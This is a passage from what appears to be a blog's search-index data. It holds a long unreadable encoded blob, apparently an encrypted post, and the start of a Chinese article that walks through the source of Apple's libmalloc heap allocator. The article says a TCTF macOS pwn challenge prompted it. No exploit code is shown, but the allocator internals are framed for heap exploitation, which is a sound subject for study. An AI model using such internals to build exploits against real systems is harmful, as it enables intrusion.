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","tags":[]},{"title":"源码解读macOS/iOS Heap","date":"2019-04-01T07:30:31.000Z","path":"2019/04/01/深入理解macos-heap/深入理解macos-heap/","text":"源码解读macOS/iOS Heap 关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。 从malloc说起malloc是我们经常使用的函数，这里也是libmalloc.dylib暴露出来的接口，另外苹果开源了libmalloc代码。所以接下来我们就从源码的角度深入下去。 void * malloc(size_t size) { void *retval; retval = malloc_zone_malloc(default_zone, size); if (retval == NULL) { errno = ENOMEM; } return retval; } 这里实际调用了malloc_zone_malloc函数，传入了default_zone全局变量 static virtual_default_zone_t virtual_default_zone __attribute__((section(&quot;__DATA,__v_zone&quot;))) __attribute__((aligned(PAGE_MAX_SIZE))) = { NULL, NULL, default_zone_size, default_zone_malloc, default_zone_calloc, default_zone_valloc, default_zone_free, default_zone_realloc, default_zone_destroy, DEFAULT_MALLOC_ZONE_STRING, default_zone_batch_malloc, default_zone_batch_free, &amp;default_zone_introspect, 10, default_zone_memalign, default_zone_free_definite_size, default_zone_pressure_relief, default_zone_malloc_claimed_address, }; static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone; 这里初始化了一个默认的zone，正如名字一样virtual_default_zone其实是一个虚假的zone，接下来是调用malloc_zone_malloc void * malloc_zone_malloc(malloc_zone_t *zone, size_t size) { MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0); void *ptr; if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) { internal_check(); } if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) { return NULL; } ptr = zone-&gt;malloc(zone, size); // if lite zone is passed in then we still call the lite methods if (malloc_logger) { malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0); } MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0); return ptr; } 这里调用的ptr = zone-&gt;malloc(zone, size);就是default_zone_malloc函数 static void * default_zone_malloc(malloc_zone_t *zone, size_t size) { zone = runtime_default_zone(); return zone-&gt;malloc(zone, size); } 这里的runtime_default_zone()很重要，其实这里才是去真正的初始化zone runtime_default_zone // inline ----inline_malloc_default_zone //inline --------_malloc_initialize_once //inline ------------_malloc_initialize() 下面看_malloc_initialize函数，去掉了一些不相干代码 static void _malloc_initialize(void *context __unused) { MALLOC_LOCK(); unsigned n; malloc_zone_t *zone = NULL; ... zone = create_scalable_zone(0, malloc_debug_flags); malloc_zone_register_while_locked(zone); malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING); initial_default_zone = zone; if (n != 0) { // make the default first, for efficiency unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *); malloc_zone_t *hold = malloc_zones[0]; if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) { malloc_set_zone_name(hold, NULL); } mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE); malloc_zones[0] = malloc_zones[n]; malloc_zones[n] = hold; mprotect(malloc_zones, protect_size, PROT_READ); } ... } 这里主要看create_scalable_zone函数，所以默认的zone实际上就是scalable zone malloc_zone_t * create_scalable_zone(size_t initial_size, unsigned debug_flags) { return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags); } szone_t * create_scalable_szone(size_t initial_size, unsigned debug_flags) { szone_t *szone; /* get memory for the zone. */ szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC); if (!szone) { return NULL; } ... // Query the number of configured processors. // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives // the same behavior as the original scalable malloc. MP gets per-CPU magazines // that scale (way) better. unsigned int max_mags = mag_max_magazines(); uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1; rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags); rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags); #if CONFIG_LARGE_CACHE // madvise(..., 